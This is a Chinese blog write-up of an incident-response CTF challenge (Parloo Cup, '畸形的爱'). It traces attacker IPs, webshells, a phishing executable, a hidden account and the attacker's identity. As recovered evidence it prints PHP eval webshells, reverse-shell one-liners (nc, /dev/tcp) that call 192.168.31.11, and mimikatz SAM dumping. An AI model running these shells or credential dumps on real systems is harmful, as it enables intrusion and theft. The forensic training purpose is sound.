@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="简介12by：第二届&quot;Parloo 杯&quot;CTF 应急响应挑战赛-畸形的爱压缩包密码：Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt  网络拓扑 资产清单   主机名 操作系统登录 服务登录    WebServer root&#x2F;root webserver&#x2F;webserver   SQL服务器 sql&#x2F;sq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Parloo杯应急响应-畸形的爱">
+<meta property="og:url" content="https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/index.html">
+<meta property="og:site_name" content="Liangmo_sec">
+<meta property="og:description" content="简介12by：第二届&quot;Parloo 杯&quot;CTF 应急响应挑战赛-畸形的爱压缩包密码：Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt  网络拓扑 资产清单   主机名 操作系统登录 服务登录    WebServer root&#x2F;root webserver&#x2F;webserver   SQL服务器 sql&#x2F;sq">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521155914167.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521165704041-1747824123744-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521170006504-1747824123744-4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521171429472-1747824123744-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521181505685.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173341481-1747824123744-5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173737215-1747824123744-7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521172939771-1747824123744-6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173151447-1747824123744-8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173920217-1747824123744-9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521174230068-1747824123744-10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521174456249-1747824123744-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521172128969-1747824123744-12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521182837811-1747824123744-13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521183052299-1747824123744-14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521183833864-1747824123745-15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521180729615-1747824123745-16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521181836088-1747824123745-17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521182310320-1747824123745-18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/99231b8e9de1d06fb66901d08958caa-1747824123745-19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521175350560-1747824123745-20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521175524079-1747824123745-21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521180121144-1747824123745-22.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521175701703-1747824123745-23.png">
+<meta property="article:published_time" content="2025-05-21T10:40:34.000Z">
+<meta property="article:modified_time" content="2025-05-21T10:46:57.169Z">
+<meta property="article:author" content="凉墨">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521155914167.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Parloo杯应急响应-畸形的爱</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/13/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA-%E5%8C%BB%E9%99%A2%E8%84%B1%E5%BA%93%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&text=Parloo杯应急响应-畸形的爱"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&is_video=false&description=Parloo杯应急响应-畸形的爱"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Parloo杯应急响应-畸形的爱&body=Check out this article: https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&name=Parloo杯应急响应-畸形的爱&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&t=Parloo杯应急响应-畸形的爱"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">2.</span> <span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%B8%85%E5%8D%95"><span class="toc-number">3.</span> <span class="toc-text">资产清单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%A2%98%E7%9B%AE"><span class="toc-number">4.</span> <span class="toc-text">应急响应题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E8%80%85ip%E5%9C%B0%E5%9D%801%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">1.攻击者ip地址1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E8%80%85ip%E5%9C%B0%E5%9D%802%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">2.攻击者ip地址2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%BC%80%E5%A7%8B%E6%97%B6%E9%97%B4%EF%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text">3.暴力破解开始时间：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-flag1%EF%BC%9A"><span class="toc-number">4.4.</span> <span class="toc-text">4.flag1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-flag2"><span class="toc-number">4.5.</span> <span class="toc-text">5.flag2:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-flag3"><span class="toc-number">4.6.</span> <span class="toc-text">6.flag3:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%96%87%E4%BB%B6%E7%9A%84%E5%93%88%E5%B8%8C32%E4%BD%8D%E5%A4%A7%E5%86%99"><span class="toc-number">4.7.</span> <span class="toc-text">钓鱼文件的哈希32位大写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-webshell%E5%AF%86%E7%A0%811%EF%BC%9A"><span class="toc-number">4.8.</span> <span class="toc-text">7.webshell密码1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-webshell%E5%AF%86%E7%A0%812%EF%BC%9A"><span class="toc-number">4.9.</span> <span class="toc-text">8.webshell密码2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%94%BB%E5%87%BB%E8%80%85%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3-1-2-3"><span class="toc-number">4.10.</span> <span class="toc-text">9.攻击者开放端口(1,2,3)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">4.11.</span> <span class="toc-text">10.隐藏账户的密码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%BA%AF%E6%BA%90-%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%9A"><span class="toc-number">4.12.</span> <span class="toc-text">11.[溯源]攻击者的邮箱：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%BA%AF%E6%BA%90-flag4%EF%BC%9A"><span class="toc-number">4.13.</span> <span class="toc-text">12.[溯源]flag4：</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Parloo杯应急响应-畸形的爱
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">凉墨</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-21T10:40:34.000Z" class="dt-published" itemprop="datePublished">2025-05-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">by：第二届&quot;Parloo 杯&quot;CTF 应急响应挑战赛-畸形的爱</span><br><span class="line">压缩包密码：Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521155914167.png" alt="image-20250521155914167"></p>
+<h2 id="资产清单"><a href="#资产清单" class="headerlink" title="资产清单"></a>资产清单</h2><table>
+<thead>
+<tr>
+<th align="left">主机名</th>
+<th align="left">操作系统登录</th>
+<th align="left">服务登录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">WebServer</td>
+<td align="left">root&#x2F;root</td>
+<td align="left">webserver&#x2F;webserver</td>
+</tr>
+<tr>
+<td align="left">SQL服务器</td>
+<td align="left">sql&#x2F;sql</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Windows7 PC1</td>
+<td align="left">administrator&#x2F;wmx666</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Windows10 PC2</td>
+<td align="left">administrator&#x2F;zjl@123</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h2 id="应急响应题目"><a href="#应急响应题目" class="headerlink" title="应急响应题目"></a>应急响应题目</h2><h3 id="1-攻击者ip地址1："><a href="#1-攻击者ip地址1：" class="headerlink" title="1.攻击者ip地址1："></a>1.攻击者ip地址1：</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521165704041-1747824123744-2.png" alt="image-20250521165704041"> 登录root用户，查看历史命令，启动了nginx服务，查看nginx日志 过滤发现192.168.31.240大量访问a.php，定位到a.php为一句话木马 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521170006504-1747824123744-4.png" alt="image-20250521170006504"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">故攻击者IP为192.168.31.240</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-攻击者ip地址2："><a href="#2-攻击者ip地址2：" class="headerlink" title="2.攻击者ip地址2："></a>2.攻击者ip地址2：</h3><p>历史命令发现存在docker服务 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521171429472-1747824123744-3.png" alt="image-20250521171429472"></p>
+<blockquote>
+<p>靶机给到我们是挂起状态，我们启动时由于架构问题需要重新启动，故手动启动容器</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">跟进容器网页目录存在clean.sh程序，查看发现反弹shell</span><br><span class="line">192.168.31.11</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-暴力破解开始时间："><a href="#3-暴力破解开始时间：" class="headerlink" title="3.暴力破解开始时间："></a>3.暴力破解开始时间：</h3><p><code>docker logs 6801404902b1|grep 192.168.31.240</code> 查看8080服务日志 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521181505685.png" alt="image-20250521181505685"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025:03:05:58</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-flag1："><a href="#4-flag1：" class="headerlink" title="4.flag1："></a>4.flag1：</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173341481-1747824123744-5.png" alt="image-20250521173341481"> 在PC2中存在everythins直接全局搜 在Tasks中搜到flag1 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">palu&#123;pc3_zgsfqwerlkssaw&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-flag2"><a href="#5-flag2" class="headerlink" title="5.flag2:"></a>5.flag2:</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173737215-1747824123744-7.png" alt="image-20250521173737215"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在flag1中存在C:\Program Files (x86)\Microsoft\a.bat</span><br><span class="line">跟进得到</span><br><span class="line">palu&#123;nizhidaowoyouduoainima&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-flag3"><a href="#6-flag3" class="headerlink" title="6.flag3:"></a>6.flag3:</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521172939771-1747824123744-6.png" alt="image-20250521172939771"> 在&#x2F;var&#x2F;www&#x2F;html首页中获得到数据库账号密码 8080服务刚好为phpmyadmin跟进库看是否存在 在id14中发现flag3 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173151447-1747824123744-8.png" alt="image-20250521173151447"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">palu&#123;sqlaabbccsbwindows&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="钓鱼文件的哈希32位大写"><a href="#钓鱼文件的哈希32位大写" class="headerlink" title="钓鱼文件的哈希32位大写"></a>钓鱼文件的哈希32位大写</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521173920217-1747824123744-9.png" alt="image-20250521173920217"><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521174230068-1747824123744-10.png" alt="image-20250521174230068"> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521174456249-1747824123744-11.png" alt="image-20250521174456249"></p>
+<p>2977CDAB8F3EE5EFDDAE61AD9F6CF203</p>
+<h3 id="7-webshell密码1："><a href="#7-webshell密码1：" class="headerlink" title="7.webshell密码1："></a>7.webshell密码1：</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521172128969-1747824123744-12.png" alt="image-20250521172128969"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在8061服务日志下过滤POST定位到/uploads/shell.php</span><br><span class="line">跟进得到内容</span><br><span class="line">&lt;?php eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">故为hack</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-webshell密码2："><a href="#8-webshell密码2：" class="headerlink" title="8.webshell密码2："></a>8.webshell密码2：</h3><p>由1可得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/a.php</span><br><span class="line">&lt;?php eval($_POST[00232]); ?&gt;</span><br><span class="line">故为00232</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-攻击者开放端口-1-2-3"><a href="#9-攻击者开放端口-1-2-3" class="headerlink" title="9.攻击者开放端口(1,2,3)"></a>9.攻击者开放端口(1,2,3)</h3><p>由题二已知8061端口存在clean.sh <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521182837811-1747824123744-13.png" alt="image-20250521182837811"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;OK&#x27;</span>;</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.31.11 1133 &gt;/tmp/f</span><br><span class="line">nc -c sh 192.168.31.11 1133</span><br><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.31.11/1133</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521183052299-1747824123744-14.png" alt="image-20250521183052299"></p>
+<blockquote>
+<p>有可能是重启了靶机的原因还是 不存在&#x2F;tmp&#x2F;.sh   直接取证镜像</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521183833864-1747824123745-15.png" alt="image-20250521183833864"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.31.11/1144 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看PC1端口连接情况 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521180729615-1747824123745-16.png" alt="image-20250521180729615"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1133,1144,8084</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-隐藏账户的密码："><a href="#10-隐藏账户的密码：" class="headerlink" title="10.隐藏账户的密码："></a>10.隐藏账户的密码：</h3><p>PC2中存在隐藏用户</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521181836088-1747824123745-17.png" alt="image-20250521181836088"> 导出C:\Windows\System32\config文件夹下的SAM、SYSTEM mimikatz获取ntlm</p>
+<p><code>lsadump::sam /sam:SAM /system:SYSTEM</code> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521182310320-1747824123745-18.png" alt="image-20250521182310320"> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/99231b8e9de1d06fb66901d08958caa-1747824123745-19.png" alt="99231b8e9de1d06fb66901d08958caa"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmx_love</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-溯源-攻击者的邮箱："><a href="#11-溯源-攻击者的邮箱：" class="headerlink" title="11.[溯源]攻击者的邮箱："></a>11.[溯源]攻击者的邮箱：</h3><p>逆向简历.exe <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521175350560-1747824123745-20.png" alt="image-20250521175350560"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到C:\Users\n0k4u\source\repos\Project2\x64\Release\Project2.pdb</span><br><span class="line">直接搜n0k4u用户名搜到github ID</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521175524079-1747824123745-21.png" alt="image-20250521175524079"> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521180121144-1747824123745-22.png" alt="image-20250521180121144"></p>
+<blockquote>
+<p>[<a target="_blank" rel="noopener" href="https://api.github.com/users/[%E7%94%A8%E6%88%B7%E5%90%8D/]/events/public)](https://api.github.com/users/%E7%94%A8%E6%88%B7%E5%90%8D/events/public)">https://api.github.com/users/[用户名\]/events/public)](https://api.github.com/users/用户名/events/public)</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过https://api.github.com/users/n0k4u/events/public接口</span><br><span class="line">查到邮箱</span><br><span class="line">n0k4u@outlook.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-溯源-flag4："><a href="#12-溯源-flag4：" class="headerlink" title="12.[溯源]flag4："></a>12.[溯源]flag4：</h3><p>根据11给的密语搜QQ号得到flag4</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250521175701703-1747824123745-23.png" alt="image-20250521175701703"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">palu&#123;loveyouibiejv&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
